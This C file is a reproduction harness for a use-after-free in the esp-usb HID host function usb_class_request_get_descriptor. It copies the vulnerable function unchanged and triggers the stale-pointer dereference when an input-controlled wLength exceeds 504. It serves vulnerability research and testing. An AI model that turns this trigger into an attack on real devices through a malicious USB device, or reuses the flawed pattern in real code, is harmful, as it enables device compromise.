/* cve_barebone harness -- esp-usb CVE (GHSA pending) / usb_class_request_get_descriptor
 * stale-pointer Use-After-Free (CWE-416).
 *
 * Isolated reproduction: usb_class_request_get_descriptor() is called directly on a
 * hid_device_t whose ctrl_xfer starts as a real 512-byte urb (matching
 * hid_host_install_device()'s actual initial allocation). A `req->wLength` big enough to
 * outgrow that buffer makes the function free+reallocate hid_device->ctrl_xfer -- but it
 * had ALREADY captured the OLD pointer into a local `ctrl_xfer` variable at function
 * entry, so the very next dereference (`ctrl_xfer->data_buffer`) reads through freed
 * memory. Crash stack: usb_class_request_get_descriptor (the read of ctrl_xfer->data_buffer
 * right after the free+realloc) -- main.
 *
 * TRIGGER: wLength > 504 (512 - USB_SETUP_PACKET_SIZE) -> forces the realloc branch.
 * SAFE:    wLength <= 504 -> existing buffer already fits -> no free/realloc, ctrl_xfer
 *          stays valid, the function completes and (for wLength>0) exercises the real
 *          memcpy-the-descriptor-out logic cleanly.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

/* ============================================================================
 * REAL type definitions usb_class_request_get_descriptor needs, copied with their
 * real names from source_code/host/usb/include/usb/usb_types_ch9.h,
 * .../usb/usb_types_stack.h and .../class/hid/usb_host_hid/hid_host.c.
 * ============================================================================ */

typedef int esp_err_t;
#define ESP_OK               0
#define ESP_FAIL            -1
#define ESP_ERR_NO_MEM        0x101
#define ESP_ERR_INVALID_ARG   0x102
#define ESP_ERR_INVALID_STATE 0x103
#define ESP_ERR_INVALID_SIZE  0x104
#define ESP_ERR_TIMEOUT       0x107

static const char *TAG = "hid-host";
/* Logging is side-effect-free in the real code too (debug/error prints); stubbed to a
 * no-op that still evaluates `tag` so the call sites type-check unchanged. */
#define ESP_LOGD(tag, fmt, ...) do { (void)(tag); } while (0)
#define ESP_LOGE(tag, fmt, ...) do { (void)(tag); } while (0)
/* usb_host_device_info() (our stub, below) never fails, so ESP_ERROR_CHECK's real
 * abort-on-failure path is unreachable; still evaluates its argument (the call). */
#define ESP_ERROR_CHECK(x) do { (void)(x); } while (0)

#define HID_RETURN_ON_ERROR(exp, msg) \
    do { esp_err_t err_rc_ = (exp); if (err_rc_ != ESP_OK) { return err_rc_; } } while (0)
#define HID_RETURN_ON_INVALID_ARG(exp) \
    do { if ((exp) == NULL) { return ESP_ERR_INVALID_ARG; } } while (0)

#define DEFAULT_TIMEOUT_MS  (5000)

/* ---- usb/usb_types_ch9.h (real, verbatim values) ---- */
#define USB_SETUP_PACKET_SIZE               8

typedef struct __attribute__((packed)) {
    uint8_t bmRequestType;
    uint8_t bRequest;
    uint16_t wValue;
    uint16_t wIndex;
    uint16_t wLength;
} usb_setup_packet_t;

#define USB_BM_REQUEST_TYPE_DIR_IN          (0x01 << 7)
#define USB_BM_REQUEST_TYPE_TYPE_STANDARD   (0x00 << 5)
#define USB_BM_REQUEST_TYPE_RECIP_INTERFACE (0x01 << 0)

/* ---- usb/usb_types_stack.h (real, verbatim field names) ---- */
typedef struct usb_device_handle_s *usb_device_handle_t;

typedef enum {
    USB_TRANSFER_STATUS_COMPLETED,
    USB_TRANSFER_STATUS_ERROR,
    USB_TRANSFER_STATUS_TIMED_OUT,
    USB_TRANSFER_STATUS_CANCELED,
    USB_TRANSFER_STATUS_STALL,
    USB_TRANSFER_STATUS_OVERFLOW,
    USB_TRANSFER_STATUS_SKIPPED,
    USB_TRANSFER_STATUS_NO_DEVICE,
} usb_transfer_status_t;

typedef struct {
    int num_bytes;
    int actual_num_bytes;
    usb_transfer_status_t status;
} usb_isoc_packet_desc_t;

typedef struct usb_transfer_s usb_transfer_t;
typedef void (*usb_transfer_cb_t)(usb_transfer_t *transfer);

struct usb_transfer_s {
    uint8_t *const data_buffer;
    const size_t data_buffer_size;
    int num_bytes;
    int actual_num_bytes;
    uint32_t flags;
    usb_device_handle_t device_handle;
    uint8_t bEndpointAddress;
    usb_transfer_status_t status;
    uint32_t timeout_ms;
    usb_transfer_cb_t callback;
    void *context;
    const int num_isoc_packets;
    usb_isoc_packet_desc_t isoc_packet_desc[];
};

/* usb_device_info_t (real, verbatim) -- only ever passed by-address to the
 * usb_host_device_info() stub below, none of its fields are read by the target. The
 * pointer-only fields' pointee type is left opaque (never touched). */
typedef struct usb_str_desc_s usb_str_desc_t;
typedef enum { USB_SPEED_LOW = 0, USB_SPEED_FULL, USB_SPEED_HIGH } usb_speed_t;
typedef struct {
    usb_device_handle_t dev_hdl;
    uint8_t port_num;
} usb_parent_dev_info_t;
typedef struct {
    usb_parent_dev_info_t parent;
    usb_speed_t speed;
    uint8_t dev_addr;
    uint8_t bMaxPacketSize0;
    uint8_t bConfigurationValue;
    const usb_str_desc_t *str_desc_manufacturer;
    const usb_str_desc_t *str_desc_product;
    const usb_str_desc_t *str_desc_serial_num;
} usb_device_info_t;

/* ---- class/hid/usb_host_hid/hid_host.c (real, verbatim field names) ----
 * hid_device_t drops the FreeRTOS-only synchronization fields (STAILQ_ENTRY,
 * device_busy/ctrl_xfer_done semaphores) -- untouched by the target function's own body,
 * so their omission changes nothing it does; ctrl_xfer/dev_hdl (the two fields the
 * target reads/writes) keep their real names and types. */
typedef struct hid_host_device {
    usb_transfer_t *ctrl_xfer;   /**< Pointer to control transfer buffer */
    usb_device_handle_t dev_hdl; /**< USB device handle */
    uint8_t dev_addr;            /**< USB device address */
} hid_device_t;

typedef struct hid_class_request {
    uint8_t bRequest;
    uint16_t wValue;
    uint16_t wIndex;
    uint16_t wLength;
    uint8_t *data;
} hid_class_request_t;

/* ============================================================================
 * Real callees on / around the crash path.
 * ============================================================================ */

/* usb_host_transfer_alloc/free: a faithful port of the REAL allocator
 * (source_code/host/usb/src/usb_private.c urb_alloc/urb_free + usb_host.c's thin public
 * wrappers), with ESP-IDF's heap_caps_* / cache-alignment / TAILQ_ENTRY swapped for plain
 * libc calloc/malloc/free (irrelevant to the bug). This preserves the load-bearing real
 * property that makes the UAF genuine: the urb struct (which EMBEDS the usb_transfer_t
 * ctrl_xfer points into) and its data_buffer are TWO SEPARATE heap allocations, and
 * usb_host_transfer_free() releases both -- so a stale usb_transfer_t* left over from
 * before a free+realloc is a dangling pointer into an actually-freed heap chunk, exactly
 * as upstream. */
typedef struct {
    uint8_t *data_buffer;
    size_t data_buffer_size;
    int num_bytes;
    int actual_num_bytes;
    uint32_t flags;
    usb_device_handle_t device_handle;
    uint8_t bEndpointAddress;
    usb_transfer_status_t status;
    uint32_t timeout_ms;
    usb_transfer_cb_t callback;
    void *context;
    int num_isoc_packets;
    usb_isoc_packet_desc_t isoc_packet_desc[0];
} usb_transfer_dummy_t; /* non-const overlay, used ONLY to initialize the const fields
                          * below -- the exact trick usb_private.c itself uses. */

typedef struct urb_s {
    void *hcd_ptr;
    uint32_t hcd_var;
    void *usb_host_client;
    bool usb_host_inflight;
    usb_transfer_t transfer; /* MUST be last: real field order (usb_private.h urb_s) */
} urb_t;

static urb_t *urb_alloc(size_t data_buffer_size, int num_isoc_packets)
{
    urb_t *urb = (urb_t *)calloc(1, sizeof(urb_t) + sizeof(usb_isoc_packet_desc_t) * (size_t)num_isoc_packets);
    void *data_buffer = malloc(data_buffer_size ? data_buffer_size : 1);
    if (urb == NULL || data_buffer == NULL) {
        free(urb);
        free(data_buffer);
        return NULL;
    }
    usb_transfer_dummy_t *dummy_transfer = (usb_transfer_dummy_t *)&urb->transfer;
    dummy_transfer->data_buffer = data_buffer;
    dummy_transfer->data_buffer_size = data_buffer_size;
    dummy_transfer->num_isoc_packets = num_isoc_packets;
    return urb;
}

static void urb_free(urb_t *urb)
{
    if (urb == NULL) {
        return;
    }
    free(urb->transfer.data_buffer);
    free(urb);
}

static esp_err_t usb_host_transfer_alloc(size_t data_buffer_size, int num_isoc_packets, usb_transfer_t **transfer)
{
    urb_t *urb = urb_alloc(data_buffer_size, num_isoc_packets);
    if (urb == NULL) {
        return ESP_ERR_NO_MEM;
    }
    *transfer = &urb->transfer;
    return ESP_OK;
}

static esp_err_t usb_host_transfer_free(usb_transfer_t *transfer)
{
    if (transfer == NULL) {
        return ESP_OK;
    }
    urb_t *urb = (urb_t *)((char *)transfer - offsetof(urb_t, transfer)); /* __containerof */
    urb_free(urb);
    return ESP_OK;
}

/* hid_device_try_lock/unlock (real names): the real bodies just take/give a FreeRTOS
 * mutex (hid_device->device_busy). This isolated single-threaded harness has no
 * contention, so the faithful behavior is "always succeeds" / "no-op". */
static inline esp_err_t hid_device_try_lock(hid_device_t *hid_device, uint32_t timeout_ms)
{
    (void)hid_device;
    (void)timeout_ms;
    return ESP_OK;
}
static inline void hid_device_unlock(hid_device_t *hid_device)
{
    (void)hid_device;
}

/* usb_host_device_info (real name/signature): the target only forwards its result via
 * ESP_ERROR_CHECK (abort-on-failure) and otherwise ignores dev_info -- so "always
 * succeed, fill with zeros" is a faithful incidental stub. */
static esp_err_t usb_host_device_info(usb_device_handle_t dev_hdl, usb_device_info_t *dev_info)
{
    (void)dev_hdl;
    memset(dev_info, 0, sizeof(*dev_info));
    return ESP_OK;
}

/* hid_control_transfer (real name/signature): the real body submits an async control URB
 * (usb_host_transfer_submit_control) and blocks on a FreeRTOS semaphore given by an
 * interrupt-context completion callback -- hardware/RTOS-bound and incidental to the bug
 * (the crash happens BEFORE this is ever called, on the triggering path). This minimal
 * faithful stub instead synchronously "completes" the transfer on the CURRENT (valid, by
 * construction reached only after any realloc already happened via hid_device->ctrl_xfer)
 * buffer: it fills data_buffer with deterministic descriptor-shaped bytes and reports
 * actual_num_bytes, so the safe path exercises the real memcpy-the-descriptor-out logic
 * in usb_class_request_get_descriptor exactly like a well-behaved device would. */
static esp_err_t hid_control_transfer(hid_device_t *hid_device, size_t len, uint32_t timeout_ms)
{
    (void)timeout_ms;
    usb_transfer_t *ctrl_xfer = hid_device->ctrl_xfer;
    ctrl_xfer->device_handle = hid_device->dev_hdl;
    ctrl_xfer->bEndpointAddress = 0;
    ctrl_xfer->num_bytes = (int)len;

    size_t data_len = (len > USB_SETUP_PACKET_SIZE) ? (len - USB_SETUP_PACKET_SIZE) : 0;
    if (data_len > ctrl_xfer->data_buffer_size - USB_SETUP_PACKET_SIZE) {
        data_len = ctrl_xfer->data_buffer_size - USB_SETUP_PACKET_SIZE;
    }
    memset(ctrl_xfer->data_buffer + USB_SETUP_PACKET_SIZE, 0x5A, data_len);
    ctrl_xfer->actual_num_bytes = (int)(USB_SETUP_PACKET_SIZE + data_len);
    return ESP_OK;
}

/* ================= TARGET (VERBATIM, byte-for-byte original_function.c) =================
 * noinline so the crash keeps its own stack frame (dc_batch requires the target function
 * name in the ASAN backtrace). */
__attribute__((noinline))
static esp_err_t usb_class_request_get_descriptor(hid_device_t *hid_device, const hid_class_request_t *req)
{
    esp_err_t ret;
    usb_transfer_t *ctrl_xfer = hid_device->ctrl_xfer;
    const size_t ctrl_size = hid_device->ctrl_xfer->data_buffer_size;

    HID_RETURN_ON_INVALID_ARG(hid_device);
    HID_RETURN_ON_INVALID_ARG(hid_device->ctrl_xfer);
    HID_RETURN_ON_INVALID_ARG(req);
    HID_RETURN_ON_INVALID_ARG(req->data);

    HID_RETURN_ON_ERROR( hid_device_try_lock(hid_device, DEFAULT_TIMEOUT_MS),
                         "HID Device is busy by other task");

    if (ctrl_size < (USB_SETUP_PACKET_SIZE + req->wLength)) {
        usb_device_info_t dev_info;
        ESP_ERROR_CHECK(usb_host_device_info(hid_device->dev_hdl, &dev_info));
        // reallocate the ctrl xfer buffer for new length
        ESP_LOGD(TAG, "Change HID ctrl xfer size from %d to %d",
                 (int) ctrl_size,
                 (int) (USB_SETUP_PACKET_SIZE + req->wLength));

        usb_host_transfer_free(hid_device->ctrl_xfer);
        HID_RETURN_ON_ERROR( usb_host_transfer_alloc(USB_SETUP_PACKET_SIZE + req->wLength,
                                                     0,
                                                     &hid_device->ctrl_xfer),
                             "Unable to allocate transfer buffer for EP0");
    }

    usb_setup_packet_t *setup = (usb_setup_packet_t *)ctrl_xfer->data_buffer;

    setup->bmRequestType = USB_BM_REQUEST_TYPE_DIR_IN |
                           USB_BM_REQUEST_TYPE_TYPE_STANDARD |
                           USB_BM_REQUEST_TYPE_RECIP_INTERFACE;
    setup->bRequest = req->bRequest;
    setup->wValue = req->wValue;
    setup->wIndex = req->wIndex;
    setup->wLength = req->wLength;

    ret = hid_control_transfer(hid_device,
                               USB_SETUP_PACKET_SIZE + req->wLength,
                               DEFAULT_TIMEOUT_MS);

    if (ESP_OK == ret) {
        ctrl_xfer->actual_num_bytes -= USB_SETUP_PACKET_SIZE;
        if (ctrl_xfer->actual_num_bytes <= req->wLength) {
            memcpy(req->data, ctrl_xfer->data_buffer + USB_SETUP_PACKET_SIZE, ctrl_xfer->actual_num_bytes);
        } else {
            ret = ESP_ERR_INVALID_SIZE;
        }
    }

    hid_device_unlock(hid_device);

    return ret;
}

/* ================= driver ================= */
int main(int argc, char **argv)
{
    if (argc < 2) { fprintf(stderr, "usage: %s <input>\n", argv[0]); return 2; }

    FILE *fp = fopen(argv[1], "rb");
    if (!fp) { perror("fopen"); return 2; }
    fseek(fp, 0, SEEK_END);
    long ln = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    if (ln < 0) ln = 0;
    size_t n = (size_t)ln;

    unsigned char *data = (unsigned char *)malloc(n + 1);   /* HEAP input, ASAN-guarded */
    if (!data) { fclose(fp); return 2; }
    size_t got = fread(data, 1, n, fp);
    fclose(fp);
    data[got] = '\0';

    /* wLength = the real attacker-controlled trigger value: the malicious HID device's
     * own advertised report-descriptor length (little-endian 16-bit, first 2 input
     * bytes). byte[2] (if present) perturbs bRequest -- along for the ride, irrelevant
     * to the bug. */
    uint16_t wLength = 0;
    if (got >= 2) {
        wLength = (uint16_t)data[0] | ((uint16_t)data[1] << 8);
    } else if (got == 1) {
        wLength = data[0];
    }
    uint8_t breq = (got >= 3) ? data[2] : 0x06; /* USB_B_REQUEST_GET_DESCRIPTOR */

    /* Real initial allocation, matching hid_host_install_device()'s actual
     * usb_host_transfer_alloc(512, 0, &hid_device->ctrl_xfer) (pre-fix constant). */
    hid_device_t hid_device;
    memset(&hid_device, 0, sizeof(hid_device));
    hid_device.dev_hdl = (usb_device_handle_t)(void *)0x1; /* opaque, never dereferenced */
    if (usb_host_transfer_alloc(512, 0, &hid_device.ctrl_xfer) != ESP_OK || hid_device.ctrl_xfer == NULL) {
        free(data);
        return 2;
    }

    /* req->data: the caller's output buffer for the descriptor bytes, sized to wLength
     * like the real hid_host_get_report_descriptor() call site. */
    size_t req_data_len = wLength ? wLength : 1;
    uint8_t *req_data = (uint8_t *)malloc(req_data_len);
    if (!req_data) { free(data); return 2; }
    memset(req_data, 0, req_data_len);

    hid_class_request_t req;
    memset(&req, 0, sizeof(req));
    req.bRequest = breq;
    req.wValue = 0x2200; /* (HID_REPORT_DESC_TYPE<<8)|0 -- real-shaped, not bug-relevant */
    req.wIndex = 0;
    req.wLength = wLength;
    req.data = req_data;

    /* volatile function pointer: forbid the compiler from proving anything about the
     * call away / folding it into main's own frame despite __attribute__((noinline)). */
    esp_err_t (* volatile fn)(hid_device_t *, const hid_class_request_t *) = usb_class_request_get_descriptor;
    esp_err_t ret = fn(&hid_device, &req);
    (void)ret;

    /* Only reached on the SAFE path (ctrl_xfer never went stale). */
    free(req_data);
    usb_host_transfer_free(hid_device.ctrl_xfer);
    free(data);
    return 0;
}
